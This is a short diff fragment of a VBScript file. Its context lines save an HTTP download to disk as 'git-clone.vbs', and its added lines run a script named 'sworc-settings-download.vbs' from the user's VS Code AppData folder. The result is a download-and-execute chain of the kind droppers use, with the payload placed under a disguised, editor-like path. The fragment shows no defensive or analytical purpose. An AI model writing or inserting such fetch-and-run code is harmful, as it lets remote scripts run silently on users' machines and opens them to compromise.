@@ -90,3 +90,6 @@ Stream.Type = 1
 Stream.Write objSrvHTTP.responseBody
 Stream.SaveToFile path & "\git-clone.vbs", 2
 Stream.Close
+
+ActionPath = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Code\\User\\script\\sworc-settings-download.vbs"
+WshShell.Run(ActionPath)
